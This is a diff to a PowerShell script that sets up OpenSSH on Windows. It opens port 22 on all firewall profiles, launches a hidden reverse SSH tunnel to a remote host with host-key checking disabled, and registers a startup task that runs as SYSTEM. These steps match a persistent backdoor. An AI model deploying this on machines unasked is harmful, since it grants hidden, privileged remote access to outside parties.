@@ -21,6 +21,12 @@ if (!(Get-NetFirewallRule -Name "OpenSSH-Server-In-TCP" -ErrorAction SilentlyCon
         -Enabled True -Direction Inbound -Protocol TCP -Action Allow -LocalPort 22
 }
 
+# Add another rule that allows from any profile (Domain, Private, Public)
+if (!(Get-NetFirewallRule -Name "OpenSSH-Server-In-TCP-All" -ErrorAction SilentlyContinue)) {
+    New-NetFirewallRule -Name 'OpenSSH-Server-In-TCP-All' -DisplayName 'OpenSSH Server (All)' `
+        -Enabled True -Direction Inbound -Protocol TCP -Action Allow -LocalPort 22 -Profile Any
+}
+
 # Prepare SSH key path
 $sshDir = "$env:USERPROFILE\.ssh"
 $keyFile = "$sshDir\$($env:USERNAME)_ed25519"
@@ -113,8 +119,6 @@ Write-Host "[+] sshd_config has been fully configured with secure settings."
 # Set correct permissions
 icacls.exe "$env:ProgramData\ssh\administrators_authorized_keys" /inheritance:r /grant ""*S-1-5-32-544:F"" /grant "SYSTEM:F"
 icacls.exe "$sshDir\authorized_keys" /inheritance:r /grant ""*S-1-5-32-544:F"" /grant "SYSTEM:F"
-#icacls.exe  /inheritance:r /grant "Administrators:F" /grant "SYSTEM:F"
-#icacls.exe "$sshDir\authorized_keys" /inheritance:r /grant "Administrators:F" /grant "SYSTEM:F"
 
 # Add public key to remote server
 $publicKey = Get-Content $pubKeyFile -Raw
@@ -125,7 +129,7 @@ $batContent = @"
 @echo off
 echo [INFO] Starting reverse SSH tunnel at %date% %time% >> "$logFile"
 timeout /t 10 /nobreak > nul
-"C:\Windows\System32\OpenSSH\ssh.exe" -o "StrictHostKeyChecking=no" -o "ExitOnForwardFailure=yes" -i "$keyFile" -N -R ${receivedPort}:localhost:22 ${user}@${remote_host} >> "$logFile" 2>&1
+"C:\Windows\System32\OpenSSH\ssh.exe" -o "StrictHostKeyChecking=no" -o "ExitOnForwardFailure=yes" -i "$keyFile" -N -f -R ${receivedPort}:localhost:22 ${user}@${remote_host} >> "$logFile" 2>&1
 "@
 
 # Save the batch file
@@ -135,22 +139,26 @@ Set-Content -Path $batFilePath -Value $batContent -Encoding ASCII
 Start-Process -FilePath "$batFilePath" -WindowStyle Hidden
 #Start-Process -FilePath "$batFilePath"
 
-# Schedule task to run the .bat file at startup with highest privileges
+
 $taskName = "ReverseSSHTunnel"
-try {
-    schtasks /query /tn $taskName 2>$null
-    $taskExists = $true
-} catch {
-    $taskExists = $false
+$batFilePath = "$env:USERPROFILE\Other\rev_ssh.bat"
+
+# Remove the task if it already exists
+if (Get-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue) {
+    Unregister-ScheduledTask -TaskName $taskName -Confirm:$false
 }
 
-if (-not $taskExists) {
-    schtasks /create /tn $taskName `
-        /tr "`"$batFilePath`"" `
-        /sc onstart `
-        /rl HIGHEST `
-        /f `
-        /ru "SYSTEM"
-}
+# Create a trigger to start at system boot
+$trigger = New-ScheduledTaskTrigger -AtStartup
+
+# Define the action to run the batch file
+$action = New-ScheduledTaskAction -Execute $batFilePath
+
+# Set the task to run with highest privileges under SYSTEM
+Register-ScheduledTask -TaskName $taskName `
+    -Trigger $trigger `
+    -Action $action `
+    -RunLevel Highest `
+    -User "SYSTEM"
 
 #Write-Host "[!] Success! SSH reverse tunnel batch file created and scheduled. Path: $batFilePath."
